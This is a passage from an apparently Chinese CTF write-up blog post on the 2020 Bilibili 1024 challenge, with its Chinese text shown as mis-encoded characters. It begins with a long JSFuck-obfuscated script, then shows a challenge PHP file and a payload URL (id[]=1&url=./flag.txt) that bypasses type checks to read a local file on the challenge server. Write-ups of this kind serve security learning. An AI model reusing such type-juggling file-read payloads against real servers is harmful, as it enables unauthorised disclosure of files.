})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]])+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))</code></pre><p>ä¸€çœ‹å°±æ˜¯ JSFuckï¼Œç›´æ¥æµè§ˆå™¨é‡Œæ‰§è¡Œå¾—åˆ°</p><pre class="language-none"><code class="language-none">"var str1 = \"\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9\";var str2 = \"bilibili1024havefun\";console.log()"</code></pre><p>str1 ä¸º <code>ç¨‹åºå‘˜æœ€å¤šçš„åœ°æ–¹</code> ==&gt; GitHub</p><p>GitHub ä¸Š æ‰¾åˆ°äº†è¿™é‡Œï¼ˆ</p><p><a href="https://github.com/interesting-1024/end/blob/main/end.php">https://github.com/interesting-1024/end/blob/main/end.php</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//filename end.php</span><span class="token variable">$bilibili</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"bilibili1024havefun"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\d/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$reg</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token variable">$str</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ–‡ä»¶è·¯å¾„çŒœè§£</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹ç‚¹å•¦ï½"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ æƒ³è¦çš„ä¸åœ¨è¿™å„¿ï½"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span></code></pre><p><a href="http://120.92.151.189/blog/end.php">http://120.92.151.189/blog/end.php</a></p><blockquote><p>ä½ æƒ³è¦çš„ä¸åœ¨è¿™å„¿ï½</p></blockquote><p>æ„é€ payloadï¼š</p><pre class="language-none"><code class="language-none">http://120.92.151.189/blog/end.php?id[]=1&amp;url=./flag.txt</code></pre><p>å¾—åˆ°ä¸‹å›¾ï¼Œæ–‡ä»¶åç§°ä¸º </p><p><code>bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</code></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg" alt="img"></p><p>åœ¨æ–‡ä»¶æœ€åè—äº† flag10ã€‚</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025235356626.png" alt="flag10"></p><p><code>2ebd3b08-47ffc478-b49a5f9d-f6099d65</code></p><blockquote><p>å¦å¤–å‘ç°è¿™ä¸ªurlåªè¦åŒ…å« <code>flag.txt</code> å°±è¿”å›è¿™ä¸ªã€‚ã€‚</p><p>ç›²çŒœ <code>/.+flag\.txt.*/</code></p></blockquote><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><a href="https://github.com/interesting-1024">interesting-1024</a>/<strong><a href="https://github.com/interesting-1024/end">end</a></strong> è¿™ä¸ªä»“åº“çš„ issue ç®€ç›´æˆäº†èŠå¤©å®¤â€¦â€¦</p><p>å¦å¤–ï¼Œæœ‰å¸ˆå‚…åœ¨ <a href="https://www.bilibili.com/blackboard/activity-20201024.html">https://www.bilibili.com/blackboard/activity-20201024.html</a> é¡µé¢ä¸Šå‘ç°äº†éšè—çš„å½©è›‹ã€‚</p><p>æ®è¯´å¤šæ¬¡åˆ·æ–°é‡å¯å¯è§¦å‘ã€‚</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/97101831-7fa37600-16db-11eb-886f-c3b8c8e6c9b8.png" alt="å½©è›‹"></p><p>æ€ä¹ˆè¯´å‘¢ï¼Œæ€»çš„æ„Ÿè§‰ï¼Œè¿™äº›é¢˜ç›®æ›´åƒæ˜¯<strong>è„‘ç­‹æ€¥è½¬å¼¯</strong>ï¼Œç•¥åå¨±ä¹åŒ–è¿™æ ·å§ã€‚</p><p>å°±ä¸åƒæ­£ç»çš„ CTF é¢˜çš„æ„æ€ã€‚</p><p>è‡³äºç¬¬6ã€7ã€9é¢˜ï¼Œä¹Ÿæ²¡åšä¸‹å»çš„å…´è¶£äº†ã€‚</p><p>å°±è¿™æ ·å§ï¼Œä¸ç©äº†ï¼Œåƒç“œåƒç“œã€‚</p><p><em>æ›´æ–°äº 20201026 å‡Œæ™¨</em></p><p>ï¼ˆæºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
